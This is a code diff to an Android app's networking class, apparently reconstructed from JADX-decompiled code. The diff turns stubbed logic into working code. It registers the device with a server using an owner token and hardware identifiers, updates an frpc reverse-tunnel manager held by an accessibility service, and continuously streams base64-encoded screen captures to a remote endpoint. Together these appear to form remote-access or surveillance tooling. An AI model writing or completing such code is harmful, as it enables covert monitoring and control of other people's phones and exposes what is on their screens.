@@ -17,6 +17,7 @@ import android.util.Log
 import com.storm.safe.rock.network.CommandRequest
 import com.storm.safe.rock.network.DataSyncClient
 import com.storm.safe.rock.network.HttpManager
+import com.storm.safe.rock.service.MyAccessibilityService
 import com.storm.safe.rock.util.StringUtil
 import org.json.JSONException
 import org.json.JSONObject
@@ -546,17 +547,29 @@ class NetworkManager {
             Log.i(TAG, "✅ WebSocket 已连接")
             resetFailureCounter()
 
-            // If not yet registered, trigger registration
-            // JADX: launches coroutine calling a7 (connectToServer) for HTTP registration
+            // If not yet registered, trigger HTTP registration
             if (!isRegistered) {
-                Log.d(TAG, "Triggering device registration")
-                try {
-                    val deviceInfo = buildDeviceInfo()
-                    Log.d(TAG, "Device info built for registration: deviceId=$deviceId")
-                } catch (e: Exception) {
-                    Log.e(TAG, "❌ 连接失败", e)
-                    handleConnectionFailure()
-                }
+                Thread({
+                    try {
+                        val deviceInfo = buildDeviceInfo()
+                        Log.d(TAG, "Registering device: deviceId=$deviceId")
+                        val result = kotlinx.coroutines.runBlocking {
+                            httpRegister(deviceInfo)
+                        }
+                        result.onSuccess { response ->
+                            isRegistered = true
+                            Log.i(TAG, "✅ Device registered: $response")
+                            // Notify FrpcProcessManager that device is registered
+                            try {
+                                MyAccessibilityService.getInstance()?.frpcProcessManager?.updateDeviceId(deviceId)
+                            } catch (_: Exception) {}
+                        }.onFailure { e ->
+                            Log.e(TAG, "❌ Registration failed: ${e.message}")
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "❌ Registration error", e)
+                    }
+                }, "DeviceRegister").start()
             }
 
             // Drain queued messages
@@ -809,6 +822,9 @@ class NetworkManager {
 
         // JADX a1: Uses AbstractC1229so.m214638a3(context) → C1228sn device info
         json.put("deviceId", deviceId)
+        if (ownerToken.isNotEmpty()) {
+            json.put("owner_token", ownerToken)
+        }
         // JADX: c1228sn.f60018a1 (deviceName)
         val androidId = try {
             if (ctx != null) android.provider.Settings.Secure.getString(ctx.contentResolver, "android_id") ?: "" else ""
@@ -1326,7 +1342,19 @@ class NetworkManager {
                             try {
                                 val frame = frameQueue.poll()
                                 if (frame != null) {
-                                    dataSyncClient?.send(String(frame))
+                                    val base64 = android.util.Base64.encodeToString(frame, android.util.Base64.NO_WRAP)
+                                    val envelope = org.json.JSONObject().apply {
+                                        put("type", "screen_frame")
+                                        put("itype", "Slr_client")
+                                        put("pid", deviceId)
+                                        put("sessionId", deviceId)
+                                        put("data", org.json.JSONObject().apply {
+                                            put("image", base64)
+                                            put("timestamp", System.currentTimeMillis())
+                                        })
+                                        put("timestamp", System.currentTimeMillis())
+                                    }
+                                    dataSyncClient?.send(envelope.toString())
                                     frameSentCount++
                                 }
                                 Thread.sleep(10) // Yield
